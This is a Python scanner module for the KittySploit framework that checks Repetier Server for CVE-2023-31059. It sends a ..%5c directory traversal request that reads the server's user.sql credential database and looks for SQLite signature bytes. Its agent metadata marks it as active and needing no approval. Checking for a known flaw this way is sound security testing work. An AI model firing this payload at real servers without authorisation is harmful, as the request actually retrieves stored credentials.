#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Repetier Server through 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Repetier Server - Directory Traversal Detection',
        'description': 'Repetier Server through 1.4.10 allows ..%5c directory traversal for reading files that contain credentials, as demonstrated by connectionLost.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'repetier', 'lfi', 'repetier-server', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://cybir.com/2023/cve/poc-repetier-server-140/',
            'https://www.repetier-server.com/download-repetier-server/',
        ],
        'cve': 'CVE-2023-31059',
    }

    def run(self):
        path = '/views..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cProgramData%5cRepetier-Server%5cdatabase%5cuser.sql%20/base/connectionLost.php'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        raw = r.content or b""
        binary_hex = ('53514C69746520666F726D6174203300',)
        if any(bytes.fromhex(h) in raw for h in binary_hex):
            self.set_info(
                severity='high',
                reason='Repetier Server - Directory Traversal detected',
                path=path,
            )
            return True
        return False

